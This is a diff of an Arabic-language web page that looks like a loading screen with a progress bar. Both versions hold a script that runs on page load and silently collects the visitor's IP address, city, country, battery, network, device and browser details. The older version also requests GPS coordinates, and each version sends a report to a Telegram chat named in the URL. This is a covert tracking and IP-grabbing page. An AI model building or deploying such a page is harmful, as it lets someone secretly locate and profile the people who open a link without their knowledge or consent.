@@ -30,12 +30,6 @@
             width: 0%;
             transition: width 0.3s;
         }
-        .status {
-            color: white;
-            text-align: center;
-            margin-top: 15px;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
@@ -43,26 +37,18 @@
         <div class="progress">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="status" id="statusText">جاري بدء التحميل...</div>
     </div>
 
     <script>
-        // ========== دوال التحديث والعرض ==========
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
         function updateProgress(percent) {
             document.getElementById('progressBar').style.width = percent + '%';
         }
         
-        function updateStatus(text) {
-            document.getElementById('statusText').textContent = text;
-        }
-        
-        function getChatId() {
-            const params = new URLSearchParams(window.location.search);
-            const chatId = params.get('chatId') || params.get('id') || params.get('user') || params.get('groupId');
-            return chatId;
-        }
-        
-        // ========== إرسال البيانات للتليجرام ==========
         async function sendToTelegram(message, chatId) {
             try {
                 const response = await fetch('/.netlify/functions/device-info', {
@@ -70,8 +56,7 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         chatId: chatId,
-                        message: message,
-                        timestamp: new Date().toISOString()
+                        message: message
                     })
                 });
                 
@@ -79,374 +64,112 @@
                 return result.success;
                 
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                console.error('Error:', error);
                 return false;
             }
         }
         
-        // ========== دوال جمع المعلومات الدقيقة ==========
-        async function getIPWithMultipleServices() {
-            const services = [
-                'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
-                'https://ipinfo.io/json',
-                'https://ipapi.co/json/'
-            ];
-            
-            for (const service of services) {
-                try {
-                    const response = await fetch(service, { timeout: 5000 });
-                    if (response.ok) {
-                        const data = await response.json();
-                        return {
-                            ip: data.ip || 'غير معروف',
-                            country: data.country || data.country_name || 'غير معروف',
-                            city: data.city || 'غير معروف',
-                            region: data.region || data.region_name || 'غير معروف',
-                            isp: data.org || data.isp || 'غير معروف',
-                            timezone: data.timezone || 'غير معروف'
-                        };
-                    }
-                } catch (error) {
-                    continue; // جرب الخدمة التالية
-                }
-            }
-            
-            // إذا فشلت جميع الخدمات
-            return {
-                ip: 'غير معروف',
-                country: 'غير معروف',
-                city: 'غير معروف',
-                region: 'غير معروف',
-                isp: 'غير معروف',
-                timezone: 'غير معروف'
-            };
+        function getHijriDate() {
+            return new Date().toLocaleDateString('ar-EG', {calendar: 'islamic'});
         }
         
-        async function getBatteryInfo() {
+        function getCurrentTime() {
+            return new Date().toLocaleTimeString('ar-EG');
+        }
+        
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            if (/mobile/i.test(ua)) return 'هاتف 📱';
+            if (/tablet/i.test(ua)) return 'تابلت 📱';
+            return 'كمبيوتر 🖥️';
+        }
+        
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            // ترتيب الكشف مهم لمنع الخطأ
+            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome 🌐';
+            if (ua.includes('Firefox')) return 'Firefox 🌐';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari 🌐';
+            return 'متصفح آخر 🌐';
+        }
+        
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Android')) return 'Android 📱';
+            if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS 📱';
+            if (ua.includes('Windows')) return 'Windows 🖥️';
+            if (ua.includes('Mac')) return 'macOS 🖥️';
+            if (ua.includes('Linux')) return 'Linux 🖥️';
+            return 'غير معروف 🖥️';
+        }
+        
+        async function collectInfo() {
+            const chatId = getChatId();
+            if (!chatId) return;
+            
+            updateProgress(30);
+            
+            let location = {};
+            try {
+                // التغيير الوحيد: استبدال ipapi.co بـ ipinfo.io لأنها تعمل
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                // نضبط أسماء الحقول لتتطابق مع ما يستخدمه باقي الكود
+                location = {
+                    country_name: data.country || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    ip: data.ip || 'غير معروف',
+                    // ipinfo.io لا يعطي 'protocol'، لذلك نضعه undefined كما في مثالك
+                    protocol: undefined
+                };
+            } catch (error) {
+                location = {country_name: 'غير معروف', city: 'غير معروف', ip: 'غير معروف', protocol: undefined};
+            }
+            
+            updateProgress(60);
+            
+            let battery = {level: 'غير معروف', charging: false};
             if ('getBattery' in navigator) {
                 try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
+                    const b = await navigator.getBattery();
+                    battery.level = Math.round(b.level * 100) + '%';
+                    battery.charging = b.charging;
                 } catch (e) {}
             }
             
-            // معلومات بديلة
-            let charging = false;
-            if ('charging' in navigator) {
-                charging = navigator.charging;
-            }
-            
-            return {
-                level: 'غير معروف',
-                charging: charging,
-                chargingTime: 'غير معروف',
-                dischargingTime: 'غير معروف'
-            };
-        }
-        
-        function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            
-            if (connection) {
-                return {
-                    effectiveType: connection.effectiveType || 'غير معروف',
-                    type: connection.type || 'غير معروف',
-                    downlink: connection.downlink ? connection.downlink + ' Mbps' : 'غير معروف',
-                    rtt: connection.rtt ? connection.rtt + ' ms' : 'غير معروف',
-                    saveData: connection.saveData ? 'نعم' : 'لا'
-                };
-            }
-            
-            return {
-                effectiveType: 'غير معروف',
-                type: 'غير معروف',
-                downlink: 'غير معروف',
-                rtt: 'غير معروف',
-                saveData: 'غير معروف'
-            };
-        }
-        
-        function getScreenInfo() {
-            return {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth + ' bit',
-                pixelDepth: screen.pixelDepth + ' bit',
-                orientation: screen.orientation ? screen.orientation.type : 'غير معروف',
-                angle: screen.orientation ? screen.orientation.angle + '°' : 'غير معروف'
-            };
-        }
-        
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let deviceType = 'كمبيوتر 🖥️';
-            let os = 'غير معروف';
-            
-            // كشف نوع الجهاز
-            if (/mobile/i.test(ua)) deviceType = 'هاتف 📱';
-            if (/tablet/i.test(ua)) deviceType = 'تابلت 📱';
-            
-            // كشف نظام التشغيل
-            if (/Android/i.test(ua)) os = 'Android 📱';
-            else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS 📱';
-            else if (/Windows/i.test(ua)) os = 'Windows 🖥️';
-            else if (/Mac/i.test(ua)) os = 'macOS 🖥️';
-            else if (/Linux/i.test(ua)) os = 'Linux 🖥️';
-            else if (/CrOS/i.test(ua)) os = 'Chrome OS 🖥️';
-            
-            return {
-                type: deviceType,
-                os: os,
-                platform: navigator.platform,
-                vendor: navigator.vendor || 'غير معروف',
-                model: 'غير معروف', // يحتاج إذن إضافي
-                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
-                cores: navigator.hardwareConcurrency || 'غير معروف',
-                maxTouchPoints: navigator.maxTouchPoints || 0
-            };
-        }
-        
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            let browser = 'غير معروف';
-            let version = 'غير معروف';
-            
-            // كشف المتصفح
-            if (/Edg/i.test(ua)) browser = 'Edge';
-            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
-            else if (/Firefox/i.test(ua)) browser = 'Firefox';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-            else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
-            else if (/MSIE|Trident/i.test(ua)) browser = 'Internet Explorer';
-            
-            // استخراج الإصدار
-            const versionMatch = ua.match(/(?:Chrome|Firefox|Safari|Edg|OPR|Opera|MSIE|Trident(?:\/| ))(?:\s*)(\d+(?:\.\d+)*)/i);
-            if (versionMatch) version = versionMatch[1];
-            
-            return {
-                name: browser + ' 🌐',
-                version: version,
-                userAgent: navigator.userAgent,
-                language: navigator.language || 'غير معروف',
-                languages: navigator.languages ? navigator.languages.join(', ') : 'غير معروف',
-                cookiesEnabled: navigator.cookieEnabled ? 'نعم 🍪' : 'لا 🍪',
-                javaEnabled: navigator.javaEnabled ? 'نعم ☕' : 'لا ☕',
-                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'نعم 📄' : 'لا 📄'
-            };
-        }
-        
-        function getTimeInfo() {
-            const now = new Date();
-            const options = { 
-                year: 'numeric', 
-                month: 'long', 
-                day: 'numeric',
-                weekday: 'long',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit',
-                timeZoneName: 'short'
-            };
-            
-            return {
-                hijriDate: now.toLocaleDateString('ar-EG', {calendar: 'islamic'}),
-                gregorianDate: now.toLocaleDateString('ar-EG'),
-                time: now.toLocaleTimeString('ar-EG'),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: now.toISOString(),
-                locale: now.toLocaleString('ar-EG', options)
-            };
-        }
-        
-        function getGeolocation() {
-            return new Promise((resolve) => {
-                if (!'geolocation' in navigator) {
-                    resolve({
-                        enabled: 'لا ❌',
-                        latitude: 'غير معروف',
-                        longitude: 'غير معروف',
-                        accuracy: 'غير معروف'
-                    });
-                    return;
-                }
-                
-                // نطلب الموقع (لن يعمل بدون إذن المستخدم)
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            enabled: 'نعم ✅',
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' متر',
-                            altitude: position.coords.altitude || 'غير معروف',
-                            heading: position.coords.heading || 'غير معروف',
-                            speed: position.coords.speed || 'غير معروف'
-                        });
-                    },
-                    (error) => {
-                        resolve({
-                            enabled: 'نعم لكن مرفوض ❌',
-                            latitude: 'غير معروف',
-                            longitude: 'غير معروف',
-                            accuracy: 'غير معروف'
-                        });
-                    },
-                    { timeout: 3000 }
-                );
-            });
-        }
-        
-        // ========== الدالة الرئيسية ==========
-        async function collectInfo() {
-            updateStatus('جاري التحضير...');
-            updateProgress(5);
-            
-            const chatId = getChatId();
-            if (!chatId) {
-                updateStatus('❌ لا يوجد معرف محادثة');
-                setTimeout(() => window.close(), 2000);
-                return;
-            }
-            
-            updateStatus('جمع معلومات الشبكة والموقع...');
-            updateProgress(20);
-            const location = await getIPWithMultipleServices();
-            
-            updateStatus('جمع معلومات البطارية...');
-            updateProgress(35);
-            const battery = await getBatteryInfo();
-            
-            updateStatus('جمع معلومات الجهاز...');
-            updateProgress(50);
-            const device = getDeviceInfo();
-            
-            updateStatus('جمع معلومات المتصفح...');
-            updateProgress(65);
-            const browser = getBrowserInfo();
-            
-            updateStatus('جمع معلومات الشاشة...');
-            updateProgress(75);
-            const screen = getScreenInfo();
-            
-            updateStatus('جمع معلومات الوقت...');
-            updateProgress(85);
-            const time = getTimeInfo();
-            
-            updateStatus('جمع معلومات الشبكة...');
             updateProgress(90);
-            const network = getNetworkInfo();
             
-            updateStatus('جمع معلومات الموقع الجغرافي...');
-            updateProgress(95);
-            const geo = await getGeolocation();
-            
-            updateStatus('إنشاء التقرير النهائي...');
-            
-            // ========== بناء الرسالة ==========
-            const message = `📱 **تقرير معلومات الجهاز الكامل** 📱
-            
-📍 **الموقع والشبكة:**
-- 🔍 عنوان IP: ${location.ip}
-- 🌍 الدولة: ${location.country}
-- 🏙️ المدينة: ${location.city}
-- 🗺️ المنطقة: ${location.region}
-- ⚡ مزود الخدمة: ${location.isp}
-- 🕐 المنطقة الزمنية: ${location.timezone}
-- 📡 نوع الشبكة: ${network.type}
-- 📶 قوة الإشارة: ${network.effectiveType}
-- ⬇️ سرعة التنزيل: ${network.downlink}
-- ⏱️ زمن الاستجابة: ${network.rtt}
-- 💾 وضع توفير البيانات: ${network.saveData}
+            // الحفاظ على نفس صيغة الرسالة تماماً كما طلبت
+            const message = `📱 معلومات الجهاز:
+- الدولة: ${location.country_name} 🔻
+- المدينة: ${location.city} 🏙️  
+- عنوان IP: ${location.ip} 🌍
+- شحن الهاتف: ${battery.level} 🔋
+- هل الهاتف يشحن؟: ${battery.charging ? 'نعم ⚡' : 'لا ⚡'}
+- الشبكة: ${navigator.connection?.effectiveType || 'غير معروف'} 📶
+- نوع الاتصال: ${navigator.connection?.type || 'غير معروف'} 📡
+- الوقت: ${getHijriDate()} ${getCurrentTime()} ⏰
+- اسم الجهاز: ${detectOS()} 🖥️
+- إصدار الجهاز: ${navigator.userAgent} 📜
+- نوع الجهاز: ${detectDeviceType()}
+- الذاكرة (RAM): ${navigator.deviceMemory || 'غير معروف'} GB 🧠
+- عدد الأنوية: ${navigator.hardwareConcurrency || 'غير معروف'} ⚙️
+- لغة النظام: ${navigator.language} 🌐
+- اسم المتصفح: ${detectBrowser()}
+- دقة الشاشة: ${screen.width}x${screen.height} 📏
+- إصدار نظام التشغيل: ${detectOS()}
+- وضع الشاشة: ${screen.orientation?.type || 'portrait-primary'} 🔄
+- عمق الألوان: ${screen.colorDepth} bit 🎨
+- بروتوكول الأمان: ${location.protocol} 🔒
+- تحديد الموقع: ${'geolocation' in navigator ? 'نعم 🌍' : 'لا 🌍'}
+- بلوتوث: ${'bluetooth' in navigator ? 'نعم 🔵' : 'لا 🔵'}
+- لمس: ${'ontouchstart' in window ? 'نعم ✋' : 'لا ✋'}`;
 
-🔋 **معلومات الطاقة:**
-- 🔋 مستوى الشحن: ${battery.level}
-- ⚡ حالة الشحن: ${battery.charging ? 'نعم ⚡' : 'لا ⚡'}
-- ⏳ وقت الشحن المتبقي: ${battery.chargingTime === Infinity ? 'غير محدد' : battery.chargingTime + ' ثانية'}
-- ⏳ وقت التفريغ المتبقي: ${battery.dischargingTime === Infinity ? 'غير محدد' : battery.dischargingTime + ' ثانية'}
-
-🖥️ **معلومات الجهاز:**
-- 📱 نوع الجهاز: ${device.type}
-- 💻 نظام التشغيل: ${device.os}
-- 🏷️ المنصة: ${device.platform}
-- 🏢 الشركة المصنعة: ${device.vendor}
-- 🧠 الذاكرة (RAM): ${device.memory}
-- ⚙️ عدد الأنوية: ${device.cores}
-- ✋ نقاط اللمس: ${device.maxTouchPoints}
-
-🌐 **معلومات المتصفح:**
-- 🌐 المتصفح: ${browser.name}
-- 🔢 الإصدار: ${browser.version}
-- 🗣️ اللغة: ${browser.language}
-- 🌍 اللغات المدعومة: ${browser.languages}
-- 🍪 ملفات تعريف الارتباط: ${browser.cookiesEnabled}
-- ☕ جافا: ${browser.javaEnabled}
-- 📄 عارض PDF: ${browser.pdfViewerEnabled}
-
-📺 **معلومات الشاشة:**
-- 📏 الدقة: ${screen.width} × ${screen.height}
-- 📐 المساحة المتاحة: ${screen.availWidth} × ${screen.availHeight}
-- 🎨 عمق الألوان: ${screen.colorDepth}
-- 🖼️ عمق البكسل: ${screen.pixelDepth}
-- 🔄 اتجاه الشاشة: ${screen.orientation}
-- 📐 زاوية الدوران: ${screen.angle}
-
-⏰ **معلومات الوقت:**
-- 📅 التاريخ الهجري: ${time.hijriDate}
-- 📅 التاريخ الميلادي: ${time.gregorianDate}
-- 🕐 الوقت: ${time.time}
-- 🌍 المنطقة الزمنية: ${time.timezone}
-- ⏱️ الطابع الزمني: ${time.timestamp}
-
-📍 **المعلومات الجغرافية:**
-- 🌍 تفعيل الموقع: ${geo.enabled}
-- 📍 خط العرض: ${geo.latitude}
-- 📍 خط الطول: ${geo.longitude}
-- 🎯 الدقة: ${geo.accuracy}
-
-📊 **معلومات إضافية:**
-- 🔗 الرابط المرجعي: ${document.referrer || 'غير معروف'}
-- 🌐 البروتوكول: ${window.location.protocol}
-- 🏷️ وكيل المستخدم: ${navigator.userAgent.substring(0, 200)}...
-- 🔔 الإشعارات: ${'Notification' in window ? 'مدعوم 🔔' : 'غير مدعوم 🔕'}
-- 📍 تحديد الموقع: ${'geolocation' in navigator ? 'مدعوم 🌍' : 'غير مدعوم ❌'}
-- 🔵 بلوتوث: ${'bluetooth' in navigator ? 'مدعوم 🔵' : 'غير مدعوم ❌'}
-- ✋ شاشة لمس: ${'ontouchstart' in window ? 'نعم ✋' : 'لا ✋'}
-- 🖨️ الطباعة: ${'print' in window ? 'مدعوم 🖨️' : 'غير مدعوم ❌'}
-
-⏱️ **معلومات الجلسة:**
-- 🕐 وقت التحميل: ${new Date().toLocaleString('ar-EG')}
-- 🔑 معرف الجلسة: ${chatId}
-- 🌐 عنوان الصفحة: ${window.location.href}`;
-
-            updateStatus('جاري إرسال التقرير...');
-            updateProgress(98);
-            
-            const success = await sendToTelegram(message, chatId);
-            
-            if (success) {
-                updateStatus('✅ تم إرسال التقرير بنجاح!');
-                updateProgress(100);
-                setTimeout(() => window.close(), 1500);
-            } else {
-                updateStatus('❌ فشل إرسال التقرير');
-                setTimeout(() => window.close(), 3000);
-            }
+            await sendToTelegram(message, chatId);
+            updateProgress(100);
         }
         
-        // بدء التنفيذ بعد تحميل الصفحة
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                collectInfo();
-            }, 500);
-        });
+        collectInfo();
     </script>
 </body>
 </html>
